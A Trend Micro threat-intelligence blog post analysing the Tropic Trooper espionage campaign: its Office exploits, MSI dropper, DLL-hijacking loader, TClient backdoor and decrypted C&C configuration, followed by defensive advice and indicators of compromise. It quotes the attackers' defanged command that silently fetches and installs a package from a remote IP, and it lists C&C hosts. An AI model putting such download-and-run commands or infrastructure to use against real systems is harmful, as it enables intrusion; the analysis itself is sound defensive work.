{
    "title": "tropic trooper_u2019s new strategy - trendlabs security intelligence blog",
    "text": "Trend Micro About TrendLabs Security Intelligence Blog\nHome    »   Exploits    »   Tropic Trooper’s New Strategy\nSecurity Predictions for 2020\nCybersecurity in 2020 will be viewed\nthrough many lenses — from differing\nattacker motivations and cybercriminal\narsenal to technological developments\nand global threat intelligence — only so\ndefenders can keep up with the broad\nrange of threats.\nRead our security predictions for 2020.\nBusiness Process Compromise\nAttackers are starting to invest in long-\nterm operations that target specific\nprocesses enterprises rely on. They\nscout for vulnerable practices,\nsusceptible systems and operational\nloopholes that they can leverage or\nabuse. To learn more, read our Security 101:\nBusiness Process Compromise.\nRecent Posts\nOpenSMTPD Vulnerability (CVE-2020-8794) Can\nLead to Root Privilege Escalation and Remote\nCode Execution\nOperation Overtrap Targets Japanese Online\nBanking Users Via Bottle Exploit Kit and Brand-\nNew Cinobi Banking Trojan\nMarch Patch Tuesday: LNK, Microsoft Word\nVulnerabilities Get Fixes, SMBv3 Patch Follows\nBusting Ghostcat: An Analysis of the Apache\nTomcat Vulnerability (CVE-2020-1938 and CNVD-\n2020-10487)\nDissecting Geost: Exposing the Anatomy of the\nAndroid Trojan Targeting Russian Banks\nPopular Posts\nLokiBot Impersonates Popular Game Launcher\nand Drops Compiled C# Code File\nMisconfigured Container Abused to Deliver\nCryptocurrency-mining Malware\nDissecting Geost: Exposing the Anatomy of the\nAndroid Trojan Targeting Russian Banks\nOutlaw Updates Kit to Kill Older Miner Versions,\nTargets More Systems\nFebruary Patch Tuesday: Fixes for Critical LNK,\nRDP, Trident Vulnerabilities\nStay Updated\nEmail Subscription\nYour email here\nSubscribe\nPrivacy Statement Legal Policies Copyright © 2020 Trend Micro Incorporated. All rights reserved.HOME AND HOME OFFICE  | FOR BUSINESS  | SECURITY INTELLIGENCE  | ABOUT TREND MICRO\nAsia Pacific Region (APAC): Australia  / New Zealand , 中国, 日本, 대한민국 , 台灣 Latin America Region (LAR): Brasil , México  North America Region (NABU): United States , Canada  \nEurope, Middle East, & Africa Region (EMEA): France , Deutschland / Österreich / Schweiz , Italia, Россия , España , United Kingdom / Ireland\nTropic Trooper’s New Strategy\nPosted on: March 14, 2018  at 7:01 am Posted in: Exploits , Malware , Targeted Attacks\nAuthor:  Trend Micro\nTags: CVE-2017-11882 CVE-2018-0802 KeyBoy Managed Detection and Response Operation Tropic Trooper\ntropic trooperby Jaromir Horejsi, Joey Chen, and Joseph C. Chen\nTropic Trooper  (also known as KeyBoy) levels its campaigns\nagainst Taiwanese, Philippine, and Hong Kong targets, focusing\non their government, healthcare, transportation, and high-tech\nindustries. Its operators are believed to be very organized and\ndevelop their own cyberespionage tools that they fine-tuned in\ntheir recent campaigns. Many of the tools they use now feature\nnew behaviors, including a change in the way they maintain a\nfoothold in the targeted network.\nAttack Chain\nFigure 1. Attack chain of Tropic Trooper’s operations\nHere’s a summary of the attack chain of Tropic Trooper’s recent campaigns:\n1. Execute a command through exploits for CVE-2017-11882  or CVE-2018-0802 , security flaws\nin Microsoft Office’s Equation Editor (EQNEDT32.EXE).\n2. Download an installer package (.msi) and install it on the system by executing the command:\n/c msiexec /q /i [hxxp://61[.]216[.]5[.]24/in.sys]) .\n3. This system configuration file (in.sys) will drop a backdoor installer ( UserInstall.exe ) then\ndelete itself. The backdoor installer will drop a normal sidebar.exe file  (a Windows Gadget\ntool, a feature already discontinued  by Windows), a malicious loader (in\n“C:\\ProgramData\\Apple\\Update\\wab32res.dll “), and an encrypted configuration file.\nUserInstall.exe  will abuse the BITSadmin  command-line tool to create a job and launch\nsidebar.exe .\n4. The malicious loader will use dynamic-link library (DLL) hijacking — injecting malicious code\ninto a process of a file/application — on sidebar.exe  and launch dllhost.exe  (a normal file).\nThe loader will then inject a DLL backdoor into dllhost.exe .\nWe also observed malicious documents that don’t need to download anything from the internet as\nthe backdoor’s dropper is already embedded in the document. This, however, doesn’t influence\nthe overall result for the victim.\nThe backdoor will load the encrypted configuration file and decrypt it, then use Secure Sockets\nLayer (SSL) protocol to connect to command-and-control (C&C) servers.\nTropic Trooper uses exploit-laden Microsoft Office documents to deliver malware to targets. These\ndocuments use job vacancies in organizations that may be deemed socio-politically sensitive to\nrecipients. Below is a screenshot of the document used in their latest campaigns:\nFigure 2. Malicious document used by Tropic Trooper\nPDB Strings as Context Clues\nThe MSI file has two program database (PDB) strings inside: one belonging to the MSI file, and\nanother for the backdoor installer (detected by Trend Micro as TROJ_TCDROP.ZTFB).\nFigure 3. PDB strings inside the MSI file\nThe first PDB string has a certain ss2/Projects/MsiWrapper  (Project MsiWrapper) in it, which we\nfound to be an open-source application that converts executable setup programs to MSI files. The\nsecond PDB string contains Work, House, and TSSL: we can assume this tool belongs to Tropic\nTrooper’s TSSL project as seen  by other researchers. Here it is a new one, as seen in their\nmisspelling of “Horse” to “House” (other reports had the string typed correctly).\nAnother interesting PDB string we found is\nD:\\Work\\Project\\VS\\house\\Apple\\Apple_20180115\\Release\\InstallClient.pdb . At installation, the\nMSI file drops three files and creates one hidden directory (UFile) into\nC:\\ProgramData\\Apple\\Update\\ , likely as a ruse.\nIt would then use sidebar.exe  to load the malicious wab32res.dll  (TROJ_TCLT.ZDFB) through DLL\nhijacking. This is carried out to evade antivirus (AV) detection, because wab32res.dll  is loaded by\na benign file.\nFigure 4. The installer drops three files into the Apple/Update directory\nFigure 5. PDB strings inside the loader file\nFrom the PDB string above, the attackers intended it to be a loader (hence the name FakeRun )\nand not the actual backdoor. FakeRun’s PDB string\n(D:\\Work\\Project\\VS\\house\\Apple\\Apple_20180115\\Release\\FakeRun.pdb ) indicates the loader\nwill execute dllhost.exe  and inject one malicious DLL file, which is the backdoor, into this process.\nThe backdoor, TClient (BKDR_TCLT.ZDFB), is so named from its own PDB string.\nFigure 6. TClient is injected into dllhost.exe\nMalware Analysis \nwab32res.dll  (FakeRun loader) loads TClient. Once the loader is executed, it will check the current\nprocess ( sidebar.exe ) whether to load it or not. Successfully checking the loader will execute the\ndllhost.exe  process and create a hardcode mutex to avoid injecting it into the wrong dllhost.exe , as\nthere can be multiple instances of it depending on the number of programs using the Internet\nInformation Services .\nFigure 7. The loader checking the sidebar process\nFigure 8. The malicious loader injecting the backdoor into dllhost.exe\nFigure 9. Comparison of TClient’s configuration format in 2016 (left, from other researchers ) and\n2018 (right)\nTClient will use SSL to connect to Tropic Trooper’s C&C server. However, the C&C server and\nsome configuration values are not hardcoded in the backdoor. This allows Tropic Trooper’s\noperators to easily change/update the C&C server and configure other values.\nTClient is actually one of Tropic Trooper’s other backdoors. The backdoor noted by other security\nresearchers was encoded with different algorithms and configured with different parameter names\nin 2016, for instance. TClient uses symmetric encryption to decrypt its configuration with one 16-\nbyte key in 2018. The image and table below illustrate TClient’s encrypted configuration that we\ndecrypted (via Python code):\nFigure 10. Snapshot of code we used to decrypt TClient’s configuration\nFigure 11. Encrypted backdoor configuration\nDescription Decryption Strings\nCheck code MDDEFGEGETGIZ\nAddr1: tel.qpoe[.]com\nAddr2: elderscrolls.wikaba[.]com\nAddr3: tel.qpoe[.]com\nPort1: 443\nPort2: 443\nPort3: 53\nLoginPasswd: someone\nHostMark: mark\nProxy: 0\nFigure 12. Decrypted backdoor configuration\nReverse analysis of TClient allowed us to determine how to decrypt the C&C information. TClient\nwill use custom SSL libraries to connect the C&C server. We also found another SSL certificate on\nthis C&C server. A closer look reveals that it was registered quite recently, and is set to expire after\na year, suggesting Tropic Trooper’s use or abuse of components or services that elapse so they\ncan leave as few traces as possible.\nFigure 13. SSL certificate’s validity\nFollowing Tropic Trooper’s Trails \nWe further monitored their activities and found three additional and notable PDB strings in their\nmalware:\nD:\\Work\\Project\\VS\\HSSL\\HSSL_Unicode _2\\Release\\ServiceClient.pdb\nD:\\Work\\VS\\Horse\\TSSL\\TSSL_v3.0\\TClient\\Release\\TClient.pdb\nD:\\Work\\VS\\Horse\\TSSL\\TSSL_v0.3.1_20170722\\TClient\\x64\\Release\\TClient.pdb\nThese came from open-intelligence platforms and incident response cases. These strings shed\nfurther light on Tropic Trooper’s operations:\nThey have another campaign/project named HSSL, which supports Unicode characters.\nThe TSSL project has a v3.0 version, indicating the operators can mix and match different\nversions of their malware, depending on their target.\nThe TSSL project has 64-bit version.\nThe Need for a Proactive Incident Response Strategy\nCyberespionage campaigns are persistent and, as shown by Tropic Trooper, always raring to\nexploit weaknesses in people and technology. For organizations, this highlights the significance of\nstaying ahead of their attackers: detect, analyze, and respond. What techniques will they use?\nHow can my organization’s attack surface be reduced? What did I do to respond to the threat —\nwhat worked, what didn’t, and what could be fine-tuned?\nA proactive incident response strategy  provides threat intelligence — from the endpoint to the\nnetwork — that can let IT/system administrators identify malicious activities that aren’t typically\nvisible to traditional security solutions.\nTClient, for instance, uses DLL hijacking and injection that may not be as noticeable to others. Its\nuse of the SSL protocol also means it can blend with legitimate traffic. Analyzing their PDB strings\ncan also provide a deeper insight into the campaign’s bigger picture. Ascertaining the tactics and\ntechniques they use empower organizations in developing robust and actionable indicators of\ncompromise (IoCs) that can act as benchmarks for response.\nHere are some best practices that organizations can adopt:\nKeep the system, its applications, and the network updated. The vulnerabilities that Tropic\nTrooper’s campaigns have been patched last January , for instance. Enforce a stronger patch\nmanagement  policy, and consider virtual patching  for legacy systems.\nEnforce the principle of least privilege: Employ network segmentation  and data categorization\nto deter lateral movement and mitigate further exposure. Application control  and behavior\nmonitoring block suspicious files and anomalous routines from being installed or executed in\nthe system.\nDisable or secure the use of system administration tools  such as PowerShell  and other\ncommand-line tools  that may be abused.\nActively monitor your perimeter, from gateways  and endpoints  to networks  and servers .\nFirewalls  as well as intrusion detection and prevention systems  help thwart network-based\nattacks.\nNurture a culture of cybersecurity. Spear-phishing emails, for instance, rely on baiting targets\nwith socially engineered documents. The technologies that help protect the organization are\nonly as good as the people who use them.\nIndicators of Compromise (IoCs):\nRelated Hashes (SHA-256):\nDetected as CVE-2018-0802.ZTFC:\n1d128fd61c2c121d9f2e1628630833172427e5d486cdd4b6d567b7bdac13935e\nBKDR_TCLT.ZDFB:\n01087051f41df7bb030256c97497f69bc5b5551829da81b8db3f46ba622d8a69\nBKDR64_TCLT.ZTFB:\n6e900e5b6dc4f21a004c5b5908c81f055db0d7026b3c5e105708586f85d3e334\nTROJ_SCLT.ZTFB:\n49df4fec76a0ffaee5e4d933a734126c1a7b32d1c9cb5ab22a868e8bfc653245\nTROJ_TCDROP.ZTFB:\nb0f120b11f727f197353bc2c98d606ed08a06f14a1c012d3db6fe0a812df528a\nd65f809f7684b28a6fa2d9397582f350318027999be3acf1241ff44d4df36a3a\n85d32cb3ae046a38254b953a00b37bb87047ec435edb0ce359a867447ee30f8b\nTROJ_TCLT.ZDFB:\n02281e26e89b61d84e2df66a0eeb729c5babd94607b1422505cd388843dd5456\nfb9c9cbf6925de8c7b6ce8e7a8d5290e628be0b82a58f3e968426c0f734f38f6\nURLs related to C&C communication:\nqpoe[.]com\nwikaba[.]com\ntibetnews[.]today\ndns-stuff[.]com\n2waky[.]com\nLearn how to protect Enterprises, Small Businesses, and Home Users from ransomware:\nENTERPRISE SMALL BUSINESS HOME15 \n\n» » »\nHome Categories\nSearch:\n "
}